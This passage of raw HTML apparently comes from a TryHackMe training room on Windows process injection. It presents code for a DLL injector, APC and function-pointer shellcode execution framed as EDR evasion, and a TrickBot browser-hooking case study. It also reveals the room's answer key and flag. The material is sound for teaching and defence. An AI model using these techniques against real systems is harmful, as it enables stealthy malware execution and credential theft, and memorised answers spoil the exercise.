			<span class="token number">0</span> <span class="token comment">// Indicates the current process</span>
		<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>hSnapshot<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        PROCESSENTRY32 entry<span class="token punctuation">;</span> <span class="token comment">// Adds a pointer to the PROCESSENTRY32 structure</span>
        entry<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PROCESSENTRY32<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Obtains the byte size of the structure</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Process32First</span><span class="token punctuation">(</span> <span class="token comment">// Obtains the first process in the snapshot</span>
					hSnapshot<span class="token punctuation">,</span> <span class="token comment">// Handle of the snapshot</span>
					<span class="token operator">&amp;</span>entry <span class="token comment">// Pointer to the PROCESSENTRY32 structure</span>
				<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">do</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span> <span class="token comment">// Compares two strings to determine if the process name matches</span>
									entry<span class="token punctuation">.</span>szExeFile<span class="token punctuation">,</span> <span class="token comment">// Executable file name of the current process from PROCESSENTRY32</span>
									processName <span class="token comment">// Supplied process name</span>
								<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
                    <span class="token keyword">return</span> entry<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">;</span> <span class="token comment">// Process ID of matched process</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">Process32Next</span><span class="token punctuation">(</span> <span class="token comment">// Obtains the next process in the snapshot</span>
							hSnapshot<span class="token punctuation">,</span> <span class="token comment">// Handle of the snapshot</span>
							<span class="token operator">&amp;</span>entry
						<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Pointer to the PROCESSENTRY32 structure</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

DWORD processId <span class="token operator">=</span> <span class="token function">getProcessId</span><span class="token punctuation">(</span>processName<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Stores the enumerated process ID</span>
</code></pre>
<p>At step two, after the PID has been enumerated, we need to open the process. This can be accomplished from a variety of Windows API calls: <code>GetModuleHandle</code>, <code>GetProcAddress</code>, or <code>OpenProcess</code>.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>
	PROCESS_ALL_ACCESS<span class="token punctuation">,</span> <span class="token comment">// Requests all possible access rights</span>
	FALSE<span class="token punctuation">,</span> <span class="token comment">// Child processes do not inheret parent process handle</span>
	processId <span class="token comment">// Stored process ID</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><span>At step three, memory must be allocated for the provided malicious <a class="Fs2OFWbS glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;Fs2OFWbS&#39;)">DLL</a> to reside. As with most injectors, this can be accomplished using </span><code>VirtualAllocEx</code>.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">LPVOID dllAllocatedMemory <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>
	hProcess<span class="token punctuation">,</span> <span class="token comment">// Handle for the target process</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span> 
	<span class="token function">strlen</span><span class="token punctuation">(</span>dllLibFullPath<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"><span>// Size of the <a class="bYBPWCwf glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;bYBPWCwf&#39;)">DLL</a> path</span></span>
	MEM_RESERVE <span class="token operator">|</span> MEM_COMMIT<span class="token punctuation">,</span> <span class="token comment">// Reserves and commits pages</span>
	PAGE_EXECUTE_READWRITE <span class="token comment">// Enables execution and read/write access to the commited pages</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><span>At step four, we need to write the malicious <a class="VEozPHTp glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;VEozPHTp&#39;)">DLL</a> to the allocated memory location. We can use </span><code>WriteProcessMemory</code> to write to the allocated region.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>
	hProcess<span class="token punctuation">,</span> <span class="token comment">// Handle for the target process</span>
	dllAllocatedMemory<span class="token punctuation">,</span> <span class="token comment">// Allocated memory region</span>
	dllLibFullPath<span class="token punctuation">,</span> <span class="token comment"><span>// Path to the malicious <a class="MyICUaDW glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;MyICUaDW&#39;)">DLL</a></span></span>
	<span class="token function">strlen</span><span class="token punctuation">(</span>dllLibFullPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment"><span>// Byte size of the malicious <a class="npRG3tbr glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;npRG3tbr&#39;)">DLL</a></span></span>
	<span class="token constant">NULL</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><span>At step five, our malicious <a class="aX0qOOAc glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;aX0qOOAc&#39;)">DLL</a> is written to memory and all we need to do is load and execute it. To load the DLL we need to use </span><code>LoadLibrary</code>; imported from <code>kernel32</code>. Once loaded,&nbsp;<code>CreateRemoteThread</code> can be used to execute memory using <code>LoadLibrary</code> as the starting function.</p>
<pre class=" language-cpp" tabindex="0"><code class=" language-cpp">
LPVOID loadLibrary <span class="token operator">=</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span>
	<span class="token function">GetModuleHandle</span><span class="token punctuation">(</span><span class="token string">"kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// Handle of the module containing the call</span>
	<span class="token string">"LoadLibraryA"</span> <span class="token comment">// API call to import</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
HANDLE remoteThreadHandler <span class="token operator">=</span> <span class="token function">CreateRemoteThread</span><span class="token punctuation">(</span>
	hProcess<span class="token punctuation">,</span> <span class="token comment">// Handle for the target process</span>
	<span class="token constant">NULL</span><span class="token punctuation">,</span> 
	<span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// Default size from the execuatable of the stack</span>
	<span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span> loadLibrary<span class="token punctuation">,</span> pointer to the starting function
	dllAllocatedMemory<span class="token punctuation">,</span> <span class="token comment">// pointer to the allocated memory region</span>
	<span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// Runs immediately after creation</span>
	<span class="token constant">NULL</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><span>We can compile these steps together to create a <a class="voydqrx4 glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;voydqrx4&#39;)">DLL</a> injector. Use the C++ injector provided and experiment with DLL injection.</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <span style="font-size:1rem"><span>Identify a PID and name of a process running as THM-Attacker to target. Supply the name and malicious <a class="jERayxpm glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;jERayxpm&#39;)">DLL</a> found in the Injectors directory as arguments to execute </span><i>dll</i></span><i>-injector.exe</i><span style="font-size:1rem">&nbsp;located in the Injectors directory on the desktop.&nbsp;</span><br>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p><span style="font-size:1rem">What flag is obtained after injecting the DLL?</span><br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*******************}" value="THM{n07_4_m4l1c10u5_dll}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-6">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse6">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 6                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Memory Execution Alternatives
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse6" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span>Depending on the environment you are placed in, you may need to alter the way that you execute your shellcode. This could occur when there are hooks on an API call and you cannot evade or unhook them, an <a class="Jt062JTL glossary-term" onclick="initPopOver(&#39;EDR&#39;, &#39;Jt062JTL&#39;)">EDR</a> is monitoring threads, etc.</span></p>
<p>Up to this point, we have primarily looked at methods of allocating and writing data to and from local/remote processes. Execution is also a vital step in any injection technique; although not as important when attempting to minimize memory artifacts and IOCs (<strong>I</strong>ndicators <strong>o</strong>f <strong>C</strong>ompromise). Unlike allocating and writing data, execution has many options to choose from.</p>
<p>Throughout this room, we have observed execution primarily through <code>CreateThread</code> and its counterpart, <code>CreateRemoteThread</code>.</p>
<p>In this task we will cover three other execution methods that can be used depending on the circumstances of your environment.</p><p><span style="font-size:24px">Invoking Function Pointers</span></p><p>The void function pointer is an oddly novel method of memory block execution that relies solely on typecasting.</p><p>This technique can only be executed with locally allocated memory but does not rely on any API calls or other system functionality.</p><p>

</p><p>The one-liner below is the most common form of the void function pointer, but we can break it down further to explain its components.</p>

<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Function Pointer
        </div>
        <pre class="terminal-code language-html" tabindex="0"><code class=" language-shell-session language-html"></code><pre style="color:#bac8d4;font-size:1em"><span></span>
<span style="color:yellow">(</span><span style="color:red">(void(*)()</span><span style="color:yellow">)addressPointer)</span><span style="color:green">();</span></pre></pre></div>
</div>

<p>This one-liner can be hard to comprehend or explain since it is so dense, let's walk through it as it processes the pointer.</p><ol>
<li>Create a function pointer <code>(void(*)()</code>, outlined in red</li>
<li>Cast the allocated memory pointer or shellcode array into the function pointer <code>(&lt;function pointer&gt;)addressPointer)</code>, outlined in yellow</li>
<li>Invoke the function pointer to execute the shellcode <code>();</code>, outlined in green</li>
</ol><p>

</p><p>This technique has a very specific use case but can be very evasive and helpful when needed.</p><p><span style="font-size:24px">Asynchronous Procedure Calls</span></p><p>From the <a href="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">Microsoft documentation</a> on Asynchronous Procedure Calls, “An asynchronous procedure call (APC) is a function that executes asynchronously in the context of a particular thread.”</p><p>An APC function is queued to a thread through <code>QueueUserAPC</code>. Once queued the APC function results in a software interrupt and executes the function the next time the thread is scheduled.</p><p>In order for a userland/user-mode application to queue an APC function the thread must be in an “<em>alertable state</em>”. An alertable state requires the thread to be waiting for a callback such as <code>WaitForSingleObject</code> or <code>Sleep</code>.</p><p>Now that we understand what APC functions are let's look at how they can be used maliciously! We will use <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code> for allocating and writing to memory.</p><pre class=" language-c" tabindex="0"><code class=" language-c"><span class="token function">QueueUserAPC</span><span class="token punctuation">(</span>
	<span class="token punctuation">(</span>PAPCFUNC<span class="token punctuation">)</span>addressPointer<span class="token punctuation">,</span> <span class="token comment">// APC function pointer to allocated memory defined by winnt</span>
	pinfo<span class="token punctuation">.</span>hThread<span class="token punctuation">,</span> <span class="token comment">// Handle to thread from PROCESS_INFORMATION structure</span>
	<span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token constant">NULL</span>
	<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ResumeThread</span><span class="token punctuation">(</span>
	pinfo<span class="token punctuation">.</span>hThread <span class="token comment">// Handle to thread from PROCESS_INFORMATION structure</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>
	pinfo<span class="token punctuation">.</span>hThread<span class="token punctuation">,</span> <span class="token comment">// Handle to thread from PROCESS_INFORMATION structure</span>
	INFINITE <span class="token comment">// Wait infinitely until alerted</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>




</p><p>This technique is a great alternative to thread execution, but it has recently gained traction in detection engineering and specific traps are being implemented for APC abuse. This can still be a great option depending on the detection measures you are facing.</p><p><span style="font-size:24px">Section Manipulation</span></p><p>A commonly seen technique in malware research is PE (<strong>P</strong>ortable <strong>E</strong>xecutable) and section manipulation. As a refresher, the PE format defines the structure and formatting of an executable file in Windows. For execution purposes, we are mainly focused on the sections, specifically <code>.data</code> and <code>.text</code>, tables and pointers to sections are also commonly used to execute data.</p><p>We will not go in-depth with these techniques since they are complex and require a large technical breakdown, but we will discuss their basic principles.</p><p><span>To begin with any section manipulation technique, we need to obtain a PE dump. Obtaining a PE dump is commonly accomplished with a <a class="xktMJnvN glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;xktMJnvN&#39;)">DLL</a> or other malicious file fed into </span><code>xxd</code>.</p><p>At the core of each method, it is using math to move through the physical hex data which is translated to PE data.</p><p>Some of the more commonly known techniques include RVA entry point parsing, section mapping, and relocation table parsing.</p><hr><p>





</p><p>With all injection techniques, the ability to mix and match commonly researched methods is endless. This provides you as an attacker with a plethora of options to manipulate your malicious data and execute it.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What protocol is used to execute asynchronously in the context of a thread?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ************ ********* ****" value="Asynchronous Procedure Call" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What is the Windows API call used to queue an APC function?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ************" value="QueueUserAPC" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Can the void function pointer be used on a remote process? (y/n)</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *" value="n" disabled="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-7">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse7">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 7                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Case Study in Browser Injection and Hooking
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse7" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>To get hands on with the implications of process injection we can observe the TTPs (<strong>T</strong>actics,&nbsp;<strong>T</strong>echniques, and&nbsp;<strong>P</strong>rocedures) of TrickBot.</p><p>Credit for initial research: <a href="https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/"><em>SentinelLabs</em></a></p><p>TrickBot is a well known banking malware that has recently regained popularity in financial crimeware. The main function of the malware we will be observing is browser hooking. Browser hooking allows the malware to hook interesting API calls that can be used to intercept/steal credentials.</p><p>To begin our analysis, let’s look at how they’re targeting browsers. From <em>SentinelLab’s</em> reverse engineering, it is clear that <code>OpenProcess</code> is being used to obtain handles for common browser paths; seen in the disassembly below.</p><pre class=" language-wasm" tabindex="0"><code class=" language-wasm">push   eax
push   0
push   438h
call   ds:OpenProcess
mov    edi, eax
mov    [edp,hProcess], edi
test   edi, edi
jz     loc_100045EE
</code></pre><pre class=" language-wasm" tabindex="0"><code class=" language-wasm">push   offset Srch            ; "chrome.exe"
lea    eax, [ebp+pe.szExeFile]
...
mov    eax, ecx
push   offset aIexplore_exe   ; "iexplore.exe"
push   eax                    ; lpFirst
...
mov    eax, ecx
push   offset aFirefox_exe   ; "firefox.exe"
push   eax                    ; lpFirst
...
mov    eax, ecx
push   offset aMicrosoftedgec   ; "microsoftedgecp.exe"
...
</code></pre><p>The current source code for the reflective injection is unclear but <em>SentinelLabs</em> has outlined the basic program flow of the injection below.</p><ol>
<li>Open Target Process, <code>OpenProcess</code></li>
<li>Allocate memory, <code>VirtualAllocEx</code></li>
<li>Copy function into allocated memory, <code>WriteProcessMemory</code></li>
<li>Copy shellcode into allocated memory, <code>WriteProcessMemory</code></li>
<li>Flush cache to commit changes, <code>FlushInstructionCache</code></li>
<li>Create a remote thread, <code>RemoteThread</code></li>
<li>Resume the thread or fallback to create a new user thread, <code>ResumeThread</code> or <code>RtlCreateUserThread</code></li>
</ol><p>Once injected TrickBot will call its <em>hook installer function</em> copied into memory at step three. Pseudo-code for the installer function has been provided by <em>SentinelLabs</em> below.</p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp">relative_offset <span class="token operator">=</span> myHook_function <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>original_function <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">;</span>
v8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>original_function<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
trampoline_lpvoid <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>original_function <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
jmp_32_bit_relative_offset_opcode <span class="token operator">=</span> <span class="token number">0xE9u</span><span class="token punctuation">;</span>		<span class="token comment">// "0xE9" -&gt; opcode for a jump with a 32bit relative offset</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token number">0xFFFFFFFF</span><span class="token punctuation">,</span> trampoline_lpvoid<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>flOldProtect<span class="token punctuation">)</span> <span class="token punctuation">)</span>	<span class="token comment">// Set up the function for "PAGE_EXECUTE_READWRITE" w/ VirtualProtectEx</span>
<span class="token punctuation">{</span>
	v10 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>original_function <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	v11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>original_function<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>original_function <span class="token operator">-</span> <span class="token number">0x47</span><span class="token punctuation">;</span>
	original_function<span class="token punctuation">[</span><span class="token number">66</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE9u</span><span class="token punctuation">;</span>
	<span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>original_function <span class="token operator">+</span> <span class="token number">0x43</span><span class="token punctuation">)</span> <span class="token operator">=</span> v10 <span class="token operator">+</span> v11<span class="token punctuation">;</span>
	<span class="token function">write_hook_iter</span><span class="token punctuation">(</span>v10<span class="token punctuation">,</span> <span class="token operator">&amp;</span>jmp_32_bit_relative_offset_opcode<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// -&gt; Manually write the hook</span>
	<span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>		<span class="token comment">// Return to original protect state</span>
		<span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token number">0xFFFFFFFF</span><span class="token punctuation">,</span>
		<span class="token operator">*</span><span class="token punctuation">(</span>LPVOID <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>original_function <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>original_function<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
		flOldProtect<span class="token punctuation">,</span>
		<span class="token operator">&amp;</span>flOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>
result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
</code></pre><p>Let’s break this code down, it may seem daunting at first, but it can be broken down into smaller sections of knowledge we have gained throughout this room.</p><p>The first section of interesting code we see can be identified as function pointers; you may recall this from the previous task on invoking function pointers.</p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp">relative_offset <span class="token operator">=</span> myHook_function <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>original_function <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">;</span>
v8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>original_function<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
trampoline_lpvoid <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>original_function <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>Once function pointers are defined the malware will use them to modify the memory protections of the function using <code>VirtualProtectEx</code>.</p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token number">0xFFFFFFFF</span><span class="token punctuation">,</span> trampoline_lpvoid<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>flOldProtect<span class="token punctuation">)</span> <span class="token punctuation">)</span>
</code></pre><p>At this point, the code turns into malware funny business with function pointer hooking. It is not essential to understand the technical requirements of this code for this room. At its bare bones, this code section will rewrite a hook to point to an opcode jump.</p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp">v10 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>original_function <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>original_function<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>original_function <span class="token operator">-</span> <span class="token number">0x47</span><span class="token punctuation">;</span>
original_function<span class="token punctuation">[</span><span class="token number">66</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE9u</span><span class="token punctuation">;</span>
<span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>original_function <span class="token operator">+</span> <span class="token number">0x43</span><span class="token punctuation">)</span> <span class="token operator">=</span> v10 <span class="token operator">+</span> v11<span class="token punctuation">;</span>
<span class="token function">write_hook_iter</span><span class="token punctuation">(</span>v10<span class="token punctuation">,</span> <span class="token operator">&amp;</span>jmp_32_bit_relative_offset_opcode<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// -&gt; Manually write the hook</span>
</code></pre><p>Once hooked it will return the function to its original memory protections.</p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>		<span class="token comment">// Return to original protect state</span>
		<span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token number">0xFFFFFFFF</span><span class="token punctuation">,</span>
		<span class="token operator">*</span><span class="token punctuation">(</span>LPVOID <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>original_function <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>original_function<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
		flOldProtect<span class="token punctuation">,</span>
		<span class="token operator">&amp;</span>flOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><hr><p>



















</p><p>This may still seem like a lot of code and technical knowledge being thrown and that is okay! The main takeaway of the hooking function for TrickBot is that it will inject itself into browser processes using reflective injection and hook API calls from the injected function.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What alternative Windows API call was used by TrickBot to create a new user thread?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *******************" value="RtlCreateUserThread" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Was the injection techniques employed by TrickBot reflective? (y/n)</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *" value="y" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What function name was used to manually write hooks?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***************" value="write_hook_iter" disabled="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-8">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse8">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 8                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Conclusion
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
